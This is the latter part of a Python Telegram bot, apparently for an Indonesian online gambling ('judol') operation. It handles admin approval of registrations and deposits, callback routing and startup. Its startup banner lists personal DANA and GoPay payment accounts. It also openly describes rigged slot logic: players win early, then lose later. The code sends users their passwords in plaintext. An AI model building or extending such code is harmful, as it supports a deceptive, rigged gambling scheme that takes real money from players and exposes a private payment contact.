        parse_mode='Markdown'
    )
    
    try:
        await context.bot.send_message(
            chat_id=int(telegram_id),
            text=f"✅ *AKUN ANDA TELAH DIAPPROVE!*\n\n"
                 f"👤 Username: {req['username']}\n"
                 f"🔑 Password: {req['password']}\n\n"
                 f"Silakan LOGIN dengan perintah /start",
            parse_mode='Markdown'
        )
    except:
        pass

async def admin_reject_register(update: Update, context):
    query = update.callback_query
    data = query.data
    telegram_id = data.replace('reg_reject_', '')
    
    if telegram_id not in pending_registrations:
        await query.answer("Request tidak ditemukan!", show_alert=True)
        return
    
    req = pending_registrations[telegram_id]
    del pending_registrations[telegram_id]
    save_data()
    
    await query.edit_message_text(
        f"❌ *REGISTRASI REJECTED!*\n\n"
        f"👤 Username: {req['username']}\n"
        f"🆔 Telegram ID: {telegram_id}\n\n"
        f"❌ Registrasi ditolak!",
        parse_mode='Markdown'
    )
    
    try:
        await context.bot.send_message(
            chat_id=int(telegram_id),
            text=f"❌ *REGISTRASI DITOLAK!*\n\n"
                 f"👤 Username: {req['username']}\n\n"
                 f"⚠️ Pendaftaran Anda ditolak oleh admin.",
            parse_mode='Markdown'
        )
    except:
        pass

async def admin_approve_deposit(update: Update, context):
    query = update.callback_query
    data = query.data
    trx_id = data.replace('deposit_approve_', '')
    
    if trx_id not in pending_deposits:
        await query.answer("Transaksi tidak ditemukan!", show_alert=True)
        return
    
    pending = pending_deposits[trx_id]
    if pending['status'] != 'pending':
        await query.answer("Transaksi sudah diproses!", show_alert=True)
        return
    
    user_id = pending['user_id']
    amount = pending['amount']
    method = pending['method']
    username = pending['username']
    
    # Hitung bonus
    bonus = 0
    if amount >= 100000:
        bonus = int(amount * 0.1)
    elif amount >= 50000:
        bonus = int(amount * 0.05)
    total = amount + bonus
    
    add_balance(user_id, total, f"Deposit via {method.upper()}", is_deposit=True)
    
    pending['status'] = 'approved'
    pending['approved_at'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    save_data()
    
    await query.edit_message_text(
        f"✅ *DEPOSIT APPROVED!*\n\n"
        f"👤 User: {username}\n"
        f"💰 Nominal: Rp {amount:,.0f}\n"
        f"🎁 Bonus: Rp {bonus:,.0f}\n"
        f"💵 Total: Rp {total:,.0f}\n"
        f"🆔 Trx ID: {trx_id}\n\n"
        f"✅ Saldo telah ditambahkan!",
        parse_mode='Markdown'
    )
    
    try:
        user_data = get_user(user_id)
        await context.bot.send_message(
            chat_id=user_id,
            text=f"✅ *DEPOSIT BERHASIL!*\n\n"
                 f"💰 Nominal: Rp {amount:,.0f}\n"
                 f"🎁 Bonus: Rp {bonus:,.0f}\n"
                 f"💵 Total: Rp {total:,.0f}\n"
                 f"💳 Metode: {method.upper()}\n"
                 f"💵 Saldo Baru: Rp {user_data['balance']:,.0f}\n\n"
                 f"🎰 Ketik /start untuk mulai main!",
            parse_mode='Markdown'
        )
    except:
        pass

async def admin_reject_deposit(update: Update, context):
    query = update.callback_query
    data = query.data
    trx_id = data.replace('deposit_reject_', '')
    
    if trx_id not in pending_deposits:
        await query.answer("Transaksi tidak ditemukan!", show_alert=True)
        return
    
    pending = pending_deposits[trx_id]
    if pending['status'] != 'pending':
        await query.answer("Transaksi sudah diproses!", show_alert=True)
        return
    
    user_id = pending['user_id']
    username = pending['username']
    amount = pending['amount']
    
    pending['status'] = 'rejected'
    pending['rejected_at'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    save_data()
    
    await query.edit_message_text(
        f"❌ *DEPOSIT REJECTED!*\n\n"
        f"👤 User: {username}\n"
        f"💰 Nominal: Rp {amount:,.0f}\n"
        f"🆔 Trx ID: {trx_id}\n\n"
        f"❌ Deposit ditolak!",
        parse_mode='Markdown'
    )
    
    try:
        await context.bot.send_message(
            chat_id=user_id,
            text=f"❌ *DEPOSIT DITOLAK!*\n\n"
                 f"💰 Nominal: Rp {amount:,.0f}\n"
                 f"🆔 Trx ID: {trx_id}\n\n"
                 f"⚠️ Silakan cek bukti transfer Anda dan ajukan deposit ulang.",
            parse_mode='Markdown'
        )
    except:
        pass

# ========== BACK ==========
async def back_main(update: Update, context):
    await start(update, context)

# ========== CALLBACK HANDLER ==========
async def callback_handler(update: Update, context):
    query = update.callback_query
    data = query.data
    
    if data == 'back_main':
        await back_main(update, context)
    elif data == 'register':
        await register_menu(update, context)
    elif data == 'login':
        await login_menu(update, context)
    elif data == 'games':
        await games_menu(update, context)
    elif data == 'deposit':
        await deposit_menu(update, context)
    elif data == 'withdraw':
        await withdraw_menu(update, context)
    elif data == 'status':
        await status_menu(update, context)
    elif data == 'bonus':
        await bonus_menu(update, context)
    elif data == 'referral':
        await bonus_referral(update, context)
    elif data == 'history':
        await history_menu(update, context)
    elif data.startswith('deposit_') and 'approve' not in data and 'reject' not in data:
        await deposit_method(update, context)
    elif data.startswith('withdraw_'):
        await withdraw_form(update, context)
    elif data.startswith('game_'):
        await game_play(update, context)
    elif data.startswith('spin_'):
        await spin_handler(update, context)
    elif data == 'bonus_daily':
        await bonus_daily(update, context)
    elif data == 'bonus_referral':
        await bonus_referral(update, context)
    elif data.startswith('reg_approve_'):
        await admin_approve_register(update, context)
    elif data.startswith('reg_reject_'):
        await admin_reject_register(update, context)
    elif data.startswith('deposit_approve_'):
        await admin_approve_deposit(update, context)
    elif data.startswith('deposit_reject_'):
        await admin_reject_deposit(update, context)

async def handle_message(update: Update, context):
    if context.user_data.get('waiting_register'):
        await handle_register(update, context)
    elif context.user_data.get('waiting_login'):
        await handle_login(update, context)
    elif context.user_data.get('waiting_deposit'):
        await handle_deposit(update, context)
    elif context.user_data.get('waiting_withdraw'):
        await handle_withdraw(update, context)

# ========== MAIN ==========
def main():
    application = Application.builder().token(TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(callback_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("=" * 55)
    print("🎰 JUDOL BOT - FULL VERSION")
    print("🤖 Bot Started!")
    print("=" * 55)
    print("💳 PAYMENT ACTIVE:")
    print(f"💙 DANA: 085969081186 (YULIANA)")
    print(f"💚 GOPAY: 085969081186 (YULIANA)")
    print("=" * 55)
    print("📝 REGISTRATION & DEPOSIT:")
    print("Setiap registrasi dan deposit akan dikirim ke ADMIN")
    print(f"👑 ADMIN ID: {ADMIN_ID}")
    print("=" * 55)
    print("🎰 SLOT FEATURES:")
    print("• Win di awal (Hot Streak)")
    print("• Kalah di akhir (Cold Streak)")
    print("• Nominal random (tidak bulat)")
    print("• Foto kalo menang")
    print("=" * 55)
    
    application.run_polling()

if __name__ == "__main__":
    main()
